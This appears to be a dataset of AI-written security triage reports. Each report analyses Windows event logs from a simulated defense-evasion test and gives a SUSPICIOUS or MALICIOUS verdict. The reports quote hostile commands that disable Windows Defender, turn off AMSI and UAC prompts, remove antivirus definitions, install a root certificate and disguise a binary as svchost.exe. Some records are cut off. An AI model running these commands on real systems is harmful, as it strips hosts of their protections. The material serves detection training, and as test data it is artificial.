   - Perform a thorough investigation to identify any additional indicators of compromise (IOCs) or persistent threats.

3. **Remediation:**
   - Rollback the unauthorized registry changes to reinstate PowerShell logging.
   - Examine and clean any malicious configurations or programs installed on the system.

4. **Audit and Monitor:**
   - Strengthen monitoring on administrative accounts and audit usage of powerful command-line tools like `cmd.exe`, `wevtutil.exe`, etc.
   - Ensure all security patches are up to date, focusing on potential vulnerabilities exploited in this context.

By addressing these concerns promptly, you can mitigate the direct threat and bolster defenses against similar future incidents."
Tamper with Windows Defender Registry,"### Detailed Analysis of the Logs

Upon reviewing the provided event logs, I have identified the following notable activities:

1. **PowerShell Activity**:
   - A PowerShell command is executed with the following activity: `Set-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"" -Name DisableAntiSpyware -Value 1`. This command is intended to disable Windows Defender AntiSpyware. Such an action is a common tactic used by malware to disable security defenses and should be scrutinized further.

2. **Sysmon Logs**:
   - **Process Creation and Execution**: Several executions of `wevtutil.exe` and `conhost.exe` are seen under the user `SERVER002\admin_test`. The use of `wevtutil.exe`, a command-line utility that enables administrators to query and configure event logs as well as export, archive, and clear logs, is quite usual in administrative tasks. However, its execution in rapid succession can be used to clear logs maliciously.
   - **Hostname, whoami, and PowerShell executions** are generally benign when executed by legitimate users. These commands can be used for system interrogation, but when viewed in conjunction with the disabling of security features, it may add suspicion.
   - **Edge Update Logs**: The continuous updates and executions of `MicrosoftEdgeUpdate.exe` seem to be related to legitimate auto-update activities for Microsoft Edge, especially given the command-line arguments for updates and registration observed.

3. **Application Logs**:
   - The repetitive edge update entries indicating the ""Service stopped"" are typical for restart cycles related to updates.

### Assessment of Situation

**Indicators of Misuse or Malicious Intent**:
- The PowerShell command to disable Windows Defender AntiSpyware is the most apparent indication of an action with malicious intent. Disabling built-in antivirus solutions without a clear business justification is highly suspicious.
  
- While some of the process executions (like `whoami.exe` or `hostname.exe`) are typical for legitimate user queries, the frequent running of these combined with the PowerShell command mentioned could suggest lateral movement or a reconnaissance phase in a compromise. 

- The execution of `wevtutil.exe` could be benign, but if associated with a malicious scenario, it might have been used to tamper with event logs.

### Conclusion

- **Resolution**: **SUSPICIOUS**

The logs have a mix of benign activities (Microsoft Edge updates) with one highly suspicious activity (PowerShell command to disable anti-spyware). The scenario requires further investigation, focusing on:
- Verifying the source, intent, and necessity of the PowerShell command within the organizational context.
- Checking for any recent security alerts or incidents that might correlate with these activities.
- Reviewing administrative tools and user accounts to ensure there aren’t any unauthorized administrators or privilege escalations.

**Guidance**: Conduct a thorough investigation by involving IT and cybersecurity teams to trace the source of the suspicious PowerShell command. It may also be necessary to perform an Endpoint Detection and Response (EDR) scan on the affected host to identify any possible indicators of compromise or remaining malicious activities. Additionally, reinforcing security policies with capabilities that restrict unauthorized script execution could prevent similar incidents."
UEFI Persistence via Wpbbin.exe File Creation,"### Detailed Analysis of the Logs:

**1. Time Changes:**
   - Several time changes are documented in both the System and Security event logs. The difference between the old and new times is minimal, suggesting minor synchronization adjustments. While these changes are documented due to the presence of EventID 4616, they are most likely benign as such adjustments can occur due to time synchronization with a time server (e.g., time.windows.com).

**2. Process and Command Analysis:**
   - **Powershell Execution:** The Sysmon log entries show powershell.exe execution using command lines that create new items in system directories (`wpbbin.exe` in `System32`). This kind of activity is considered suspicious as attackers often use PowerShell for malicious operations by leveraging its scripting capabilities to download or drop malicious payloads.
   - **wevtutil.exe and conhost.exe:**
     - Multiple instances of `wevtutil.exe` and `conhost.exe` executions are recorded. The frequent spawning of these processes might indicate reconnaissance or log clearing operations, often seen in post-exploitation phases of attacks. 

**3. Elevated Privileges:**
   - Event ID 4672 in the Security log indicates that a user (`admin_test`) received special privileges, such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, among others. While having a high integrity level is normal for admin accounts, the combination with other noted activities raises suspicion, especially in a non-administrative routine context.

**4. Sysmon Events:**
   - The frequent execution of legitimate binaries like `hostname.exe`, `whoami.exe`, etc., in high-integrity contexts could suggest command and control or living off the land (using native, trusted system binaries to conduct malicious activities) tactics.

**5. Networking Activity:**
   - The logon session using NTLM (EventID 4624) shows a network-based logon from the workstation `DESKTOP-3HL5B2P`, potentially involving the same `admin_test` account. This merits further investigation to confirm whether this is legitimate or unusual access.

### Assessment:

After a detailed review, the logs present several red flags:
- Use of PowerShell with commands designed to create files in critical system directories.
- Elevated privilege use by `admin_test`.
- Potential abuse of legitimate utilities for malicious purposes.

### Guidance on How to Proceed:

1. **Investigation:**
   - Conduct a thorough investigation into the PowerShell scripts run on the server and inspect any newly created files (like `wpbbin.exe`) for malicious behavior.
   - Review the access logs of `admin_test` for suspicious patterns and check with the account owner for unusual activities.

2. **Monitoring:**
   - Increase monitoring on the server for further anomalous behavior, especially those involving PowerShell, `wevtutil.exe`, and network-based logons.
   - Consider implementing additional power shell policy restrictions to avoid abuse.

3. **Incident Response:**
   - Based on the findings of the investigation, determine if containment or other incident response actions are necessary, such as network isolation of the affected system to prevent potential lateral movement.

### Final Resolution: **SUSPICIOUS**

While there's no conclusive evidence of malicious activity, the combination of behaviors observed suggests that further investigation is warranted to rule out a compromise."
DLL Search Order Hijacking - amsi.dll,"Upon examining the provided logs, several indicators of suspicious and potentially malicious activity are evident. Here's the detailed analysis by log type:

### Windows PowerShell Log
- **Application Execution Path**: PowerShell was executed via `C:\Users\admin_test\AppData\Roaming\updater.exe`. While PowerShell executions are common in Windows environments, the use of a non-standard path (`updater.exe` located in the AppData\Roaming directory) for launching PowerShell to execute the command `-Command exit` is suspicious. Typically, legitimate PowerShell invocations do not involve renaming or hosting executable files in random user folders unless explicitly configured by administrative users, which can be an indicator of an attempted masquerade or persistence mechanism.

### Sysmon Log
- **Cmd.exe Execution**: There is a command execution using `cmd.exe /c copy ...` that involves copying `powershell.exe` to `updater.exe` in the `%APPDATA%` directory and also copying `amsi.dll`. This action is indicative of a potential bypass attempt for application whitelisting or AMSI (Antimalware Scan Interface) to evade detection.
- **Process Hierarchy**: The parent-child relationships show that `cmd.exe` originating from `wsmprovhost.exe` was used to copy critical system files, which is an anomaly.
- **File Redirection**: The actions taken indicate efforts to maintain persistence or execute PowerShell scripts through renamed executables, a known tactic in malware schemes.
  
### Security and System Log
- **Time Changes and `svchost.exe` Activities**: There are time change logs associated with `svchost.exe`, which, in conjunction with other suspicious activity, could imply attempts to tamper with the system event logs or times to avoid detection windows or create log confusion.

### Application Log
- **Edge Update Logs**: The presence of Microsoft Edge Update logs typically indicates normal activity for system or application updates. However, when considered alongside the other, more suspicious logs, it may be a red herring or unrelated to the suspicious activity but should be checked for confirmation.

### Assessment and Resolution
Given these observations, the presence of a renamed `powershell.exe` file as `updater.exe` in the user's AppData directory, the copying and execution of this file via `cmd.exe`, and the use of `amsi.dll` suggest attempts to bypass security mechanisms. This seems to involve techniques commonly associated with malicious activities, such as obfuscation and persistence mechanisms.

**Resolution: MALICIOUS**

### Recommendations
1. **Immediate Containment**: Isolate the system (Server002) from the network to prevent potential spread or further actions by the threat actor.
2. **Review User and Process Permissions**: Investigate the account `admin_test` and any potentially compromised credentials or elevated privileges.
3. **Malware Scanning**: Conduct a comprehensive anti-malware scan focusing on the `AppData\Roaming` directory and the `updater.exe`.
4. **Audit and Revert Changes**: Review system logs for further Indicators of Compromise (IOCs) and revert unauthorized changes.
5. **Monitor for Further Activity**: Keep monitoring for unusual activities or connections post-containment.
6. **Patch and Update**: Ensure all applications, including Microsoft Edge, are updated to mitigate exploit risks.

This log review indicates a potential compromise, necessitating quick action to mitigate and remedy the situation."
AMSI Bypass - Create AMSIEnable Reg Key,"Upon reviewing the provided Windows event logs, here's a detailed analysis of potential indicators of malicious activity:

### Analysis of Windows PowerShell Logs:
- **Event ID 600**: The PowerShell command executed on the host (`Server002`) suggests the creation and modification of a registry entry that disables the Antimalware Scan Interface (AMSI). This is accomplished via:
  ```powershell
  powershell.exe & {New-Item -Path ""HKCU:\\Software\\Microsoft\\Windows Script\\Settings"" -Force | Out-Null
  New-ItemProperty -Path ""HKCU:\\Software\\Microsoft\\Windows Script\\Settings"" -Name ""AmsiEnable"" -Value 0 -PropertyType DWORD -Force | Out-Null}
  ```
  This action is a known technique used by adversaries to bypass PowerShell script malware detection provided by AMSI, indicating potentially malicious activity.

### Analysis of Sysmon Logs:
- Multiple instances of system utilities (e.g., `wevtutil.exe`, `conhost.exe`) and host identifier utilities (e.g., `hostname.exe`, `whoami.exe`) were executed, but these are not inherently malicious and might be part of legitimate administrative activities.
- A `whoami.exe` execution was noted, which often is used in reconnaissance activities by attackers.
- Another significant observation is the execution of the PowerShell command mentioned above, reinforcing its potentially malicious intent.

### Analysis of Application Logs:
- The logs show the routine stopping of the `edgeupdate` service, possibly related to routine software updates or service restarts. There’s no immediate indication of malicious activity here.

### Analysis of Security Logs:
- **Event ID 4616**: This event indicates a time change on the system. Time changes can sometimes be used to manipulate the creation or last modified times of files to avoid detection. This action by itself isn't conclusive of malicious intent without further context, but it is notable.

### Analysis of System Logs:
- Time adjustments were made via `svchost.exe` and based on `time.windows.com` synchronization, which could indicate routine time synchronization. Yet, if tied with other suspicious activity, this could indicate time-stomping.

### Conclusion and Resolution:
The use of PowerShell to disable the AMSI is a strong indicator of potentially malicious behavior. Although the execution of system utilities could be benign, when coupled with registry modification to disable security features, it suggests an effort to avoid detection.

**Final Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately review and potentially roll back any registry changes on the host `Server002` that affect AMSI to restore its functionality.
- Conduct a deeper investigation into this host to identify the source and intent of the PowerShell scripts, focusing on access logs and any unauthorized scripts.
- Evaluate if there are any other systems showing similar PowerShell behavior.
- Consider isolating the machine from the network until a comprehensive analysis can be performed, and implement enhanced monitoring of PowerShell activities across the environment.
- If not already done, ensure advanced threat protection mechanisms that can dynamically scan and block suspicious PowerShell executions are active."
UACME Bypass Method 33,"I have analyzed the provided logs for any signs of suspicious or malicious activity. Below are the key observations:

1. **Application and Security Events:**
    - **Windows Defender (SecurityCenter)**: There are multiple entries indicating that Windows Defender is enabled. This suggests that the system's built-in antivirus is active, which is a positive indication of system security.
    - **Edge Update Entries (edgeupdate)**: There are multiple entries indicating Microsoft Edge updates and associated processes. These entries by themselves are benign as they involve standard update processes. However, unusual behavior in these entries, such as abnormal schedules or frequencies, could require further analysis in the context of broader system activity.

2. **Security Log - Event ID 4624 (Logon) and 4672 (Special Privileges):**
    - Several logon events with type 5 (service startup) indicate typical service-related logins. Event 4672 follows these, indicating the assignment of special privileges to the ""SYSTEM"" account, which is typical during normal system operations.

3. **Sysmon Logs:**
    - **Process Creation Events (Event ID 1):** Numerous entries related to processes launched under the ""SYSTEM"" account with typical Windows binaries (e.g., `svchost.exe`, `wevtutil.exe`, `cmd.exe` for system updates) suggest normal system behavior concerning updates and tasks.
    - **Command Execution (cmd.exe and PowerShell):** There are notable entries indicating command-line executions. Specifically, `cmd.exe` is seen executing with a command involving:
      ```
      C:\Windows\system32\cmd.exe /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\script\33 Akagi64.exe
      ```
      This command suggests a potential problem, as the use of relative paths to access executable files buried within a user's temp directory could indicate an attempt to evade detection or execute unauthorized scripts. This could point toward malicious activity if these scripts are unauthorized or unexpected by the organization.
    - **EdgeUpdate Activities:** A large number of standard and scheduled updates and configurations for Microsoft Edge are noted, indicating typical update activity for Microsoft software.

4. **Unusual Executions:**
   - The execution of the process `Akagi64.exe` seen in the command line argument above and its context within temp directories should especially be reviewed as it doesn't appear as part of standard processes or common Microsoft operations. This is often a method used by malicious scripts to bypass certain security applications.

**Assessment:**
- The presence of `Akagi64.exe` in the context described, combined with the use of path traversal in command-line invocations, suggests **SUSPICIOUS** activity. This requires further investigation, especially around the origin of `Akagi64.exe` and its purpose. Administrative privileges and debugging capabilities were also frequently granted according to the logs, which, if abused, can lead to system compromise.

**Resolution: SUSPICIOUS**
- Further investigation is needed, focusing on the source of `Akagi64.exe`, verifying the integrity of the temp directories, and reviewing any network connections or abnormal spikes in system activity associated with this process. Additionally, ensure that all system and security updates are current to mitigate potential exploit vectors.
"
Disable Windows Security Center Notifications,"Upon reviewing the provided event logs for Server002, I have identified a sequence of events that warrant further analysis:

1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the user `SERVER002\\admin_test`. While `wevtutil.exe` is a legitimate Windows tool for managing event logs, its repeated invocation in rapid succession can be suspect, as it might be used for clearing logs or gathering system information stealthily.
   - Notably, the command-line activity involving `cmd.exe` executing registry modifications (Event ID 1, Process ID 6896 and 6904) is typically unusual if not part of a known and routine administrative task. The command `reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f` indicates a modification to the system registry, which can imply a configuration change or a potential persistence mechanism.

2. **Security Logs**:
   - The presence of Event ID 4624 and 4672 indicates a successful logon with special privileges (such as SeDebugPrivilege, SeBackupPrivilege, etc.) assigned to the user `admin_test`. These are high-level privileges that might be normal for an admin account, but if compromised, they can be leveraged by an attacker for malicious purposes.

3. **Application Logs**:
   - The log entry related to the Software Protection Platform Service doesn't directly imply malicious activity but should be noted as it ties in with system notifications and licensing checks.

**Assessment**:
- The registry modification through `cmd.exe` is particularly concerning without an apparent legitimate need, and given the high-level privileges used.
- We do not see direct evidence of payload execution or exfiltration activities but the manipulation of system configurations like this suggests a possible attempt to establish persistence or modify the system for ulterior motives.

**Resolution**: SUSPICIOUS

**Guidance**:
1. **Immediate Actions**:
   - Verify with relevant teams or system administrators if the `reg add` command corresponds with any legitimate activity requirements for system configuration or software deployment.
   - Review user activity logs and recent access patterns for `SERVER002\\admin_test` to check consistency with usual user behavior.

2. **Further Investigation**:
   - Conduct a deeper analysis of network traffic from this host around the time of the events to identify if any unauthorized access or data transfer took place.
   - Examine the integrity and modification of powershell scripts or batch jobs that could correspond to the suspicious registry operations.

3. **Preventive Measures**:
   - Implement stricter monitoring on sensitive commands execution like `wevtutil.exe` and registry changes at their source and in your centralized logging solution.
   - Consider applying role-based access controls ensuring commands that require elevated privileges aren't broadly assigned and regularly review privileged accounts' necessity for such permissions."
Remove Windows Defender Definition Files,"Upon reviewing the provided logs for the Windows machine ""Server002,"" here are the key observations and analysis:

### Application Log:
- The logs indicate that Windows Defender is active with multiple entries showing `SECURITY_PRODUCT_STATE_ON`. This suggests that the security software is operational.

### Sysmon Log:
- The logs record the executions of different processes, mainly focusing on system utilities and command-line executions by the user ""SERVER002\\admin_test.""
- **Processes of Note:**
  - `wevtutil.exe` and `conhost.exe` are legitimate Windows processes, often related to event log utilities and console window hosting respectively.
  - `whoami.exe` and `hostname.exe` are benign utilities used for retrieving system information.
  - **Suspicious Entry Detected:**
    - `cmd.exe` executed a command line to run `MpCmdRun.exe` with `-RemoveDefinitions -All` parameters. This command is used to remove all antivirus definitions from Windows Defender, effectively disabling its ability to detect malware. This activity is highly suspicious and suggests a potential attempt to disable security measures on the system.

### System Log:
- The only entry here is related to the modification of the ELAM (Early Launch Anti-Malware) configuration, which is a standard entry. However, the context is limited.

### Security Log:
- No entries are provided for analysis from the security log.

### Conclusion:
The execution of `MpCmdRun.exe` with the intent to remove all antivirus definitions is a clear indicator of potential malicious activity. This behavior suggests that an individual may be attempting to bypass or disable Windows Defender to allow unauthorized actions on the system.

**Final Assessment: MALICIOUS**

### Recommendations:
- **Investigate the User Activity:** Conduct a thorough investigation into the actions of the user ""SERVER002\\admin_test"" to understand the context and intentions.
- **Review Policies:** Ensure policies are in place to restrict the ability to modify antivirus definitions, especially for non-administrative users.
- **Immediate Remediation:**
  - Re-enable Windows Defender and update definitions.
  - Monitor the system for any new indicators of compromise or unauthorized changes.
- **Audit Logins and Permissions:** Audit all login activities and permissions for users to detect any unauthorized access or privilege escalations.

The immediate priority should be restoring the integrity of the antivirus system and understanding the full scope of the potential compromise."
Install root CA on Windows with certutil,"**Analysis of Provided Windows Event Logs:**

Upon reviewing the logs provided from the Sysmon, Application, Security, and Windows PowerShell channels, certain events could indicate potential malicious activities or warranted concerns. Below is the detailed analysis:

1. **Suspicious Use of PowerShell:**
   - In the Sysmon logs, multiple occurrences of `powershell.exe` were found with the command line `powershell.exe"" & {certutil -addstore my $env:Temp\\rootCA2.cer}` (EventID 17991). This combination indicates a script execution involving `certutil`, a legitimate Windows utility often misused by attackers for decoding and certificate storage purposes.
   - `certutil.exe` is frequently used for unauthorized purposes like decrypting or downloading additional malicious payloads. Coupled with PowerShell, this warrants concern as PowerShell is often exploited in fileless malware attacks.

2. **Use of Other Windows Utilities:**
   - Processes such as `wevtutil.exe` were invoked several times by the user `SERVER002\admin_test`. Wevtutil is used to manage Windows event logs and could be leveraged to clear log evidence after malicious activities.
   - `whoami.exe` was executed, which displays information about the current user. Attackers use this to determine their security context and privileges.
   
3. **Microsoft Edge Updates:**
   - Numerous logs consist of Microsoft Edge Update activities. This could be standard software updates although seeing the process execution repeatedly and the use of temporary directories such as `C:\Program Files (x86)\Microsoft\Temp\...` might be worth further investigation to rule out any tampering of the update process.

4. **Privilege Escalation:**
   - Security log events showed privilege escalation with EventID 4672. This showcases special privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeBackupPrivilege`, and others being elevated, which could be legitimate tasks by the system but also are used typically by malware post-exploitation phases to further infection.

5. **General Observations:**
   - Activities are grouped tightly in terms of timestamps suggesting automated workflows which could be either normal maintenance or malicious automated scripts executing tasks.
   - The consistent usage of `conhost.exe` with processes might point towards attempts to mask cyber activities alongside routine tasks.

**Assessment of the Situation:**

**Resolution: SUSPICIOUS**

The observed behaviors in the logs, particularly with PowerShell and certutil usage, coupled with multiple system utility executions and privilege escalation, raise concerns of suspicious activities. While the EdgeUpdate logs and other entries could relate to regular software maintenance, the context and concurrent suspicious PowerShell activities necessitate further investigation.

**Guidance on How to Proceed:**

1. **Further Investigation:**
   - Investigate the PowerShell command further; determine if `rootCA2.cer` is a known certificate and check the legitimacy of operations performed by certutil.
   - Assess if the `admin_test` account activities coincide with known administrative tasks or unauthorized access.
   - Review additional logs, particularly pre and post suspicious event timestamps, for more context.
   
2. **Network and System Integrity:**
   - Conduct a network trace to ensure no unusual outbound connections were initiated from certutil or other processes.
   - Audit the system for additional unusual files or scripts in directories associated with temp and certificates.

3. **Improve Defenses:**
   - Enhance monitoring of PowerShell scripts and utility usage.
   - Implement stricter rule sets and notifications for uses of known admin tools and utilities.
   - Education and preparedness plans for administrative users to recognize and escalate unauthorized actions promptly. 

Given these findings, taking the outlined precautionary measures and escalating the investigation in a controlled manner is advisable to neutralize any potential threats."
Disable UAC admin consent prompt via ConsentPromptBehaviorAdmin registry key,"Analyzing the provided logs, I have identified the following points of interest and potential concern:

### System Logs
- Most events here are related to time synchronization and do not show direct signs of compromises, such as the times being set by the `svchost.exe`. This is typical for system operations managing time settings and does not directly imply malicious activity.

### Security Logs
- Events 4616 indicate that there's been a time change in the system, with `svchost.exe` executing the change. In most cases, such changes are frequent for systems relying on time servers, particularly when using services such as Windows Time. There isn't inherently malicious about this if supported by a known service.

### Windows PowerShell Logs
- Several PowerShell events reference modification of the `ConsentPromptBehaviorAdmin` registry key, setting it to 0. This key controls the User Account Control (UAC) behavior for Admin Approval Mode. Typically, this action could lower the security threshold by disabling prompt generation, which can be suspicious if unauthorized because it implies an attempt to suppress security prompts.

### Sysmon Logs
1. **Frequent Execution of System Utilities**:
   - The execution of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and others multiple times by the `admin_test` user suggests possible reconnaissance or enumeration activities. While these tools are legitimate, their extensive usage within a short time might indicate script-based scanning or unauthorized scripting activity.

2. **Frequent Use of PowerShell**:
   - PowerShell events coupled with processes such as `WindowsPowerShell.exe` and related child processes (e.g., `conhost.exe`) further reinforce suspicion due to the command to suppress UAC prompts observed here. This behavior is indicative of someone attempting to maintain a lower profile while executing tasks that might typically generate security prompts.

3. **Execution with SYSTEM Privileges**:
   - `MicrosoftEdgeUpdate.exe` runs with SYSTEM privileges, which is expected in typical update operations, but abnormal behavior could be concerning if it deviates from the normal command-line arguments or execution patterns.

### Conclusion
Given the observations, there are several indicators of potential unauthorized or illicit activity, particularly concerning the PowerShell scripts designed to alter registry keys and possible script-based reconnaissance activities. While these actions do not undeniably confirm malicious intent, they strongly warrant further investigation, especially around unauthorized access or altered configurations.

### Resolution
**SUSPICIOUS**

### Guidance on How to Proceed
1. **Investigate User Activities**: Verify if any recent changes or anomalies in user accounts, especially the `admin_test` user, exist.
2. **PowerShell Command Review**: Audit PowerShell command history for context on the executed scripts.
3. **Registry Key Monitoring**: Reinstate UAC and ensure monitoring of registry key changes.

Modify Registry of Current User Profile - cmd,"After reviewing the provided Windows event logs, here's a detailed analysis:

### Suspicious or Anomalous Behavior:

1. **Frequent Execution of System Utilities:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `whoami.exe` are logged in Sysmon. These utilities are standard Windows components, but their frequent execution could indicate scripting or automated tasks being run, often associated with enumeration scripts.
  
2. **Registry Modification:**
   - The command `cmd.exe` executing a registry modification to hide file extensions (`reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f`) might indicate an attempt to obscure file types. While this alone isn't definitively malicious, it's a common tactic used by attackers to hide malicious files by removing known file extensions from view.

3. **Time Change Logs:**
   - Events in the Security and System logs show a time change which could indicate an attempt to manipulate log time entries. This activity may point to an effort to obfuscate actions by tampering with system time, a technique used to cover tracks in forensic timelines.

### Indicators of Malicious Activity:

- **Sysmon Process Creation Logs:**
  - The process creations logged do not seem to show any outright malicious binaries but rather standard tools possibly used in script-based attacks. The `reg.exe` execution to hide file extensions is particularly noteworthy.
  
- **High Integrity Levels:**
  - The processes executed by `admin_test` maintain a high integrity level, suggesting they run with elevated privileges often associated with actions requiring administrative rights.

### Threat Assessment and Recommendations:

- **SUSPICIOUS** - The presence of registry modifications to hide file extensions and frequent execution of enumeration utilities are suspicious. While these actions are not outright malicious, they align with techniques typical of reconnaissance and system enumeration phases of a compromise.

### Guidance:

- **Further Investigation:**
  - Check the origin of the `admin_test` user’s activities. Ensure that any batch scripts or automation tasks correspond to legitimate administrative actions.
  - Investigate the frequency and necessity of the registry modification related to hiding file extensions. This action should be justified by legitimate use cases.
  
- **Monitoring and Logging:**
  - Increase monitoring of the `admin_test` user account and ensure alerts are configured for similar unusual activities, specifically registry changes and process executions using administrative tools.
  
- **Integrity and Security Checks:**
  - Conduct a full integrity check on the server to ensure no unauthorized files or scheduled tasks are present, which could indicate persistent threats.
  
This assessment leans towards cautious suspicion, pointing towards a need for more thorough vetting and security checks to determine if these activities were benign or indicative of a deeper issue."
Renamed Microsoft.Workflow.Compiler.exe Payload Executions,"Based on the analysis of the provided Windows event logs, several activities raise suspicion and potentially indicate malicious activity. Below is the analysis:

### Analysis:

1. **Windows Security Log:**
   - **Event ID 4624 & 4672:** These events indicate a successful logon where the account ""admin_test"" was granted special privileges like `SeDebugPrivilege`, which can be potentially abused for malicious purposes, such as attaching a debugger to any process, potentially allowing for process manipulation.
   - **Event ID 5379:** Multiple occurrences of this event are seen with the subject ""admin_test,"" showing failed attempts to retrieve credentials with an error code indicating a failure in the process.

2. **Windows PowerShell Log:**
   - Execution via PowerShell of a potential suspicious command line: `""powershell.exe"" & {&""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\svchost.exe"" ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.xml"" output.txt}`. This suggests the execution of a binary named `svchost.exe` from a non-standard directory and not from `C:\Windows\System32`, which is suspicious.
   
3. **Sysmon Log:**
   - **Event ID 1 and 5:** Processes like `svchost.exe` and `WerFault.exe` are executed from non-standard paths (`C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles`) and are parented by PowerShell processes, which is atypical and suspicious.
   - Multiple `conhost.exe` and `werfault.exe` processes are spawned in a very short period, often accompanying malware execution to hide malicious activity.
   - Execution of `Microsoft.Workflow.Compiler.exe` seems to fail due to a directory not found exception, indicating possibly tampered or misused .NET applications.
   
4. **Application Log:**
   - A .NET exception caused by `svchost.exe` related to `System.IO.DirectoryNotFoundException` suggests the executable tried accessing a non-existing directory, possibly indicating malicious attempts or a failed configuration.

### Assessment:

- The use of PowerShell to run executables from temporary directories is a known Tactics, Techniques, and Procedures (TTPs) of malicious actors.
- The spawning of system processes (`svchost.exe`, `WerFault.exe`) from unusual locations and with PowerShell as a parent process are strong indicators of malicious activities, potentially indicating malware execution or misuse.
- The elevated privileges granted to ""admin_test"" could be a sign of a privilege escalation attempt which should be restricted to avoid further system compromise.
  
### Final Resolution:

- **Resolution: MALICIOUS**

The log entries contain activity consistent with known malicious behavior. Immediate action is recommended, such as conducting a thorough malware scan, monitoring for unusual outbound network traffic, and considering isolation of the affected host to prevent further compromise. Further investigation should focus on identifying the origin of the malicious PowerShell execution and potential persistent backdoors installed on the system."
Masquerading - non-windows exe running as windows exe,"Upon reviewing the logs provided from Server002, several events indicate probable unauthorized or malicious activity. Let's analyze the different aspects:

### 1. **Windows PowerShell Log:**
- **PowerShell Event Logs**: Several entries (EventRecordID 1067-1074) show execution of a PowerShell script copying and executing an application `data.003.exe` as `svchost.exe`, followed by attempts to stop the process immediately. The use of PowerShell to copy and execute files, especially with a naming disguise such as `svchost.exe`, is suspicious. These techniques can indicate the presence of malware or a cyber attack aiming to run a malicious binary under a legitimate process name.

### 2. **Security Logs:**
- **Credential Access Attempt**: A large number of Event ID 5379 indicates attempts to read credentials related to ""MicrosoftAccount"" and ""WindowsLive"", which repeatedly return the error code `3221226021`. This activity suggests possible credential scraping attempts or unauthorized access attempts.
- **Privileged Logon**: Events 4624 and 4672 show successful logons with elevated privileges. These could be normal system logon activities but should be correlated with known login sessions or users.

### 3. **Sysmon Logs:**
- **Process Creation with Suspicious Image**: The PowerShell process (17967) executing the suspicious script is logged. Additionally, multiple instances of `conhost.exe` and other console hosts spawned by the PowerShell process (events 17960, 17968) indicate potential post-exploitation activities.
- **Unexpected Activity under the SYSTEM User**: Several processes execute under the SYSTEM user's context. It's essential to determine whether these are legitimate system tasks or triggered by unauthorized scripts.

### 4. **Application Log:**
- **Windows Defender**: The Defender status is on, but there is no direct log indicating it detected or blocked any threats, which highlights the necessity of checking the definitions and ensuring it's up to date.

Modify UseTPM Registry entry,"Based on the logs provided, I have identified potential indicators of malicious activity. Let's summarize the key findings:

1. **EdgeUpdate Executables**: 
   - There are numerous instances of `MicrosoftEdgeUpdate.exe` being executed with several different command-line arguments. While Microsoft Edge Update is a legitimate process associated with browser updates, the sheer volume of executions and variations (e.g., `/ping ...`, `/update ...`, `/regsvc`, `/regserver`) could suggest something more nefarious, such as a script or malware masquerading as an update process. However, without additional context or anomalous patterns (e.g., outside typical update cycles, from unexpected directories), these could also be routine.

2. **Command-Line Execution and Registry Modification**:
   - The execution of `cmd.exe` with a command line involving registry modification (adding `HKLM\SOFTWARE\Policies\Microsoft\FVE /v UseTPM /t REG_DWORD /d 2 /f`). This command suggests an alteration of system-wide encryption settings, which could be legitimate administrative activity, but it occurs under the `admin_test` user context and may merit further scrutiny to ensure this is a sanctioned change by authorized personnel.

3. **Processes Executed by `admin_test`:**
   - There are several instances of `wevtutil.exe` and `conhost.exe` run by `admin_test`. Although this could be normal maintenance or monitoring, it might suggest a possible attempt to investigate or clear logs, especially when combined with other suspicious activities.

4. **Process Integrity and Authority Level**:
   - The log entries indicate a number of critical system processes launched under `NT AUTHORITY\SYSTEM`. This is expected for essential services; however, any anomalous new processes launched with SYSTEM level access or by unauthorized users could be risky.

5. **Miscellaneous Activities**: 
   - Use of `whoami.exe` to query current user details could suggest someone probing privileges or performing reconnaissance on the machine.

### Final Analysis Resolution:
- **SUSPICIOUS**: The activities outlined above suggest that while many actions could be benign or related to legitimate software updates and system administration, the frequency and context (e.g., extensive command-line arguments, registry edits, logs manipulation) appear unusual. Further investigation is required to ascertain legitimacy and rule out malicious intent. It is recommended to investigate the following:
  - Verify the source and legitimacy of all `MicrosoftEdgeUpdate.exe` executions, particularly those with unusual command-line parameters.
  - Confirm if the registry modification was authorized.
  - Monitor the user `admin_test` for any abnormal activity or privilege inconsistencies.
  - Check if the `wevtutil` invocations were part of regular maintenance or an attempt to manipulate logs."
Disable UAC - Switch to the secure desktop when prompting for elevation via registry key,"Upon analyzing the provided Windows logs, the following observations and assessments can be made:

### PowerShell Logs:
The PowerShell logs show an execution of a command to alter a registry key related to secure desktop prompting. Specifically, the command:
```powershell
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force
```
This command disables the secure desktop feature when prompting for elevation, which is a known technique that attackers may use to bypass security mechanisms.

### Sysmon Logs:
The Sysmon logs reveal the frequent execution of system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` by a user identified as `SERVER002\admin_test`. Of particular concern is the execution of PowerShell with the command line arguments that modify the registry key as noted above. This action is preceded or followed by processes like `wevtutil.exe`, which could be related to event log manipulation.

The logs also show frequent executions of various Microsoft Edge Update executables. While these are legitimate processes, they appear alongside the suspicious PowerShell activity, which might indicate potential misuse.

### Application Logs:
The logs indicate multiple ""Service stopped"" messages from `edgeupdate`, which aligns with the Sysmon logs showing multiple related processes being initialized. 

### Assessment:
The key indicator of potential malicious activity is the unauthorized modification of a critical registry key that directly impacts the security posture of elevation prompts. This type of alteration is not typically associated with standard user or administrative activity unless specific changes are required and documented under controlled environments.

### Conclusion:
